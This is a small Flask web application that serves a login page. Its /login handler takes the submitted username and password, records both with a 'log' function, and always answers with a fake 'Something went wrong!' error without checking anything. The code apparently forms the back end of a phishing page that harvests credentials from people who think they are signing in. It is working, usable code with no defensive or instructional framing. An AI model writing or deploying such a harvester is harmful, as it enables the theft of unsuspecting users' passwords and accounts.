from flask import Flask
from flask import render_template, request
from logger import log
app = Flask(__name__)
@app.route("/")
def hello_world():
    return render_template("login.html")
@app.route("/login", methods=['POST'])
def login():
    #POST
    error = "Something went wrong!"
    username = request.form['username']
    password = request.form['password']
    log(username, password)
    return render_template('login.html', error=error)
